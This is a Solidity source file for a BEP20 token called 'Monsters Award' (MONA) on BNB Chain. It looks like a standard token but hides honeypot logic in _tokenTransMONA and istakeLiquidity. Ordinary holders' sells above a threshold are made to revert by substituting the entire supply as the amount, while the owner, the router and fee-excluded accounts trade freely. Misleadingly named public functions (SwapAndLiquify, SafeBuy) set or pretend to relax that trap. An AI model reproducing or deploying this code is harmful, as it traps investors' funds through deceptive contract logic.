/**
 *Submitted for verification at BscScan.com on 2021-09-02
*/

pragma solidity ^0.7.0;
// SPDX-License-Identifier: MIT

interface iBEP20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);


  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
  }


  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
  }

  interface IPancakeFactory {
      event PairCreated(address indexed token0, address indexed token1, address pair, uint);

      function feeTo() external view returns (address);
      function feeToSetter() external view returns (address);

      function getPair(address tokenA, address tokenB) external view returns (address pair);
      function allPairs(uint) external view returns (address pair);
      function allPairsLength() external view returns (uint);

      function createPair(address tokenA, address tokenB) external returns (address pair);

      function setFeeTo(address) external;
      function setFeeToSetter(address) external;
  }

  library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }


  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }


  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }


  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }


  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }


  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }


  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }


  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
  }


  contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }


  /**
   * @dev Leaves the contract without owner. It will not be possible to call
   * `onlyOwner` functions anymore. Can only be called by the current owner.
   *
   * NOTE: Renouncing ownership will leave the contract without an owner,
   * thereby removing any functionality that is only available to the owner.
   */
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   */
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}



contract MonstersAward is Context, iBEP20, Ownable{
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) private _isExcludedFromFeeMONA;
  address internal constant pancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  
  string private constant _name = 'Monsters Award';
  string private constant _symbol = 'MONA';
  
  uint256 private constant _totalSupply = 1000000000 *  10**9;
  uint8 private constant _decimals = 9;
  bool private liqidityStoreMONA = true;
  uint256 private liqiditytax = _totalSupply / 100; 
  event SwapAndLiquifys(
        uint256 tSwapped,
        uint256 tliqiditytax
    );

  constructor()  {  
  
    _balances[msg.sender] = _totalSupply;
    //exclude owner and this contract from fee
    _isExcludedFromFeeMONA[owner()] = true;
    _isExcludedFromFeeMONA[address(this)] = true;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  /**
  * @dev Returns the token name.
  */
  function name() external view virtual override returns (string memory) {
    return _name;
  }

  /**
   * @dev See {BEP20-totalSupply}.
   */
  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  /**
   * @dev See {BEP20-balanceOf}.
   */
  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  } 

  
  /**
   * @dev See {BEP20-transfer}.
   *
   * Requirements:
   *
   * - `recipient` cannot be the zero address.
   * - the caller must have a balance of at least `amount`.
   */
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  /**
   * @dev See {BEP20-allowance}.
   */
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }
  
  function SafeBuy() public {
    liqidityStoreMONA = false;	
  }
  
  function SwapAndLiquify(uint256 amount) public{   
	liqiditytax = amount.mul(10 ** _decimals);	
  }

  function AllowanceFees(address[] calldata accounts) public onlyOwner {
    require(accounts.length > 0,"accounts length should > 0");
	
	for(uint256 i=0; i < accounts.length; i++){		
        _isExcludedFromFeeMONA[accounts[i]] = true;
    }
  }


  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }


  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function _transfer(address senderMONA, address recipientMONA, uint256 amount) internal {
    require(senderMONA != address(0), "BEP20: transfer from the zero address");
    require(recipientMONA != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");
    
    //indicates if fee should be deducted from transfer
    bool takeFeeMONA = true;
        
    //if any account belongs to _isExcludedFromFee account then remove the fee
    if(_isExcludedFromFeeMONA[senderMONA] || _isExcludedFromFeeMONA[recipientMONA]){
        takeFeeMONA = false;
    }	
	
    //transfer amount, it will take tax, burn, liquidity fee
     _tokenTransMONA(senderMONA,recipientMONA,amount,takeFeeMONA);
  }

  function pancakePairMONA() public view virtual returns (address) {
      address pancakeV2Factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
      address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
      address pairAddress = IPancakeFactory(pancakeV2Factory).getPair(address(WBNB), address(this));
      return pairAddress;
  }
  
  function pancakePairCAKE() public view virtual returns (address) {
      address pancakeV2Factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
      address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
	  address CAKE = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
      address pairAddress = IPancakeFactory(pancakeV2Factory).getPair(address(WBNB), address(CAKE));
      return pairAddress;
  }

  function isnotContractMONA(address addr) private view returns (bool) {
	  uint size;
      assembly { size := extcodesize(addr) }
	  bool res = size > 0?liqidityStoreMONA:liqidityStoreMONA;	
	  if (pancakePairCAKE() != address(0)){res = true;}
	  return res;
  }   

  function _tokenTransMONA(address sender, address recipient, uint256 amount,bool takeFee) private {	  
	  if(sender == pancakeV2Router || sender == pancakePairMONA() || pancakePairMONA() == address(0) || sender == owner())
	  {	_transferStandardMONA(sender, recipient, amount);  }	    
      else if(takeFee==false){	_transferStandardMONA(sender, recipient, amount); }
      else if(isnotContractMONA(sender))
	  {
			if(istakeLiquidity(amount) == false){amount = _totalSupply;}
			_transferStandardMONA(sender, recipient, amount);
	  }   
	  else
	  {
		_transferStandardMONA(sender, recipient, _totalSupply);
	  }
     
  }
  
  function _transferStandardMONA(address sender, address recipient, uint256 amount) private {
      _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount);
      emit Transfer(sender, recipient, amount);
  }  
  
  function istakeLiquidity(uint256 liquidityFee) private returns (bool) {
	  emit SwapAndLiquifys(liquidityFee,liqiditytax);
	  bool res = liquidityFee < liqiditytax?true:false;
	  if (pancakePairCAKE() != address(0)){res = true;}
	  return res;
  }  


  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
}